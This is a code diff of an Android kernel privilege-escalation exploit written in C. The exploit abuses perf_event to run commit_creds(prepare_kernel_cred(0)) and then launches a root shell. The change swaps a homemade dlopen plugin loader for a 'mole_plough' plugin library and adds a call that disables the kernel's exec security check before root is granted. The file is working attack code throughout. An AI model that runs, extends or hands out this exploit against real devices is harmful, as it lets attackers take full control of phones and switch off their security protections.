@@ -25,10 +25,8 @@
 #include <fcntl.h>
 #include <sys/mman.h>
 #include <sys/syscall.h>
-#include <dlfcn.h>
-#include <dirent.h>
 
-#include "mole_plugin.h"
+#include "plugins/mole_plough_plugin.h"
 
 #include "perf_event_exploit/perf_event.h"
 #include "kallsyms/kallsyms_in_memory.h"
@@ -45,7 +43,7 @@
 #define KERNEL_ADDRESS 0xc0008000
 #define KERNEL_SIZE    0x01800000
 
-static mole_plugin **plugins = NULL;
+static mole_plough_plugins *plugin_handler;
 
 static bool
 call_ptmx_fsync(void *user_data)
@@ -74,42 +72,10 @@ syscall_perf_event_open(uint32_t offset)
   return fd;
 }
 
-static int
-call_pre_commit_creds(void)
+static void *
+address_converter(void *target, void *base)
 {
-  int i = 0;
-
-  if (!plugins) {
-    return 0;
-  }
-
-  while (plugins[i]) {
-    if (plugins[i]->pre_commit_creds) {
-      plugins[i]->pre_commit_creds();
-    }
-    i++;
-  }
-
-  return 0;
-}
-
-static int
-call_post_commit_creds(void)
-{
-  int i = 0;
-
-  if (!plugins) {
-    return 0;
-  }
-
-  while (plugins[i]) {
-    if (plugins[i]->pre_commit_creds) {
-      plugins[i]->pre_commit_creds();
-    }
-    i++;
-  }
-
-  return 0;
+  return target;
 }
 
 struct cred;
@@ -121,15 +87,9 @@ int (*commit_creds)(struct cred *) = NULL;
 int
 obtain_root_privilege(void)
 {
-  int ret;
+  mole_plough_plugin_disable_exec_security_check(plugin_handler, address_converter, NULL);
 
-  call_pre_commit_creds();
-
-  ret = commit_creds(prepare_kernel_cred(0));
-
-  call_post_commit_creds();
-
-  return ret;
+  return commit_creds(prepare_kernel_cred(0));
 }
 
 static bool
@@ -437,33 +397,6 @@ run_exploit(int offset)
   return perf_event_run_exploit_with_offset(offset, (int)&obtain_root_privilege, call_ptmx_fsync, NULL);
 }
 
-static void
-resolve_plugin_symbols(void)
-{
-  int i = 0;
-
-  if (!plugins) {
-    return;
-  }
-
-  while (plugins[i]) {
-    neccessary_symbol *symbol;
-    symbol = plugins[i]->neccessary_symbols;
-    while (symbol && symbol->name) {
-      if (symbol->multiplicity == MULTIPLE) {
-        (*((void**)symbol->address)) =
-          (void*)kallsyms_in_memory_lookup_names(symbol->name);
-      } else {
-        (*((void**)symbol->address)) =
-          (void*)kallsyms_in_memory_lookup_name(symbol->name);
-      }
-      symbol++;
-    }
-    i++;
-  }
-
-}
-
 static bool
 setup_kernel_functions(int offset)
 {
@@ -479,7 +412,9 @@ setup_kernel_functions(int offset)
     commit_creds = (void*)kallsyms_in_memory_lookup_name("commit_creds");
     prepare_kernel_cred = (void*)kallsyms_in_memory_lookup_name("prepare_kernel_cred");
 
-    resolve_plugin_symbols();
+    if (plugin_handler) {
+      mole_plough_plugin_resolve_symbols(plugin_handler);
+    }
   }
   free(kernel);
 
@@ -499,119 +434,6 @@ run_root_shell(int offset)
   return execl("/system/bin/sh", "/system/bin/sh", NULL);
 }
 
-#define PLUGIN_PREFIX "mole-"
-#define PLUGIN_SUFFIX ".so"
-
-static bool
-has_prefix(const char *string)
-{
-
-}
-
-static bool
-is_plugin_file(const char *file_name)
-{
-  size_t file_name_length;
-  size_t prefix_length;
-  size_t suffix_length;
-
-  file_name_length = strlen(file_name);
-  prefix_length = strlen(PLUGIN_PREFIX);
-  suffix_length = strlen(PLUGIN_SUFFIX);
-
-  if (file_name_length < prefix_length + suffix_length) {
-    return false;
-  }
-
-  return !strncmp(file_name, PLUGIN_PREFIX, prefix_length) &&
-         !strncmp(file_name + file_name_length - suffix_length,
-                  PLUGIN_SUFFIX, suffix_length);
-}
-
-static mole_plugin *
-load_plugin(const char *file_name)
-{
-  mole_plugin *plugin;
-  void *handle;
-
-  handle = dlopen(file_name, RTLD_LAZY);
-  if (!handle) {
-    dlerror();
-    return NULL;
-  }
-
-  plugin = dlsym(handle, "MOLE_PLUGIN");
-  if (!plugin) {
-    dlclose(handle);
-    return NULL;
-  }
-
-  return plugin;
-}
-
-static int
-load_all_plugins(const char *dir_name)
-{
-  void *handle;
-  struct dirent *entry;
-  DIR *dir;
-  int count = 0;
-
-  dir = opendir(dir_name);
-  if (!dir) {
-    return -ENOENT;
-  }
-
-  entry = readdir(dir);
-  while (entry) {
-    if (is_plugin_file(entry->d_name)) {
-      count++;
-    }
-    entry = readdir(dir);
-  }
-  rewinddir(dir);
-
-  plugins = calloc(sizeof(mole_plugin*), count + 1);
-
-  count = 0;
-  entry = readdir(dir);
-  while (entry) {
-    if (is_plugin_file(entry->d_name)) {
-      mole_plugin *plugin;
-      char file_path[PATH_MAX];
-      snprintf(file_path, sizeof(file_path), "%s/%s", dir_name, entry->d_name);
-      plugin = load_plugin(file_path);
-      if (plugin) {
-        plugins[count] = load_plugin(file_path);
-        count++;
-      }
-    }
-    entry = readdir(dir);
-  }
-
-  closedir(dir);
-}
-
-static char *
-get_plugin_path(char *program_path)
-{
-  char current_directory[PATH_MAX];
-  char path[PATH_MAX];
-  char *last_slash;
-  char *program_directory;
-
-  last_slash = strrchr(program_path, '/');
-  getcwd(current_directory, sizeof(current_directory));
-
-  program_directory = strndup(program_path, last_slash - program_path);
-
-  snprintf(path, sizeof(path), "%s%s", current_directory, program_directory);
-
-  free(program_directory);
-
-  return strdup(path);
-}
-
 int
 main(int argc, char **argv)
 {
@@ -625,11 +447,7 @@ main(int argc, char **argv)
     if (argc >= 2 && !strcmp("dump", argv[1])) {
       dump_kernel_image(offset, argc, argv);
     } else {
-      char *plugin_path;
-
-      plugin_path = get_plugin_path(argv[0]);
-      load_all_plugins(plugin_path);
-      free(plugin_path);
+      plugin_handler = mole_plough_plugin_load_all_plugins(argv[0]);
 
       run_root_shell(offset);
     }
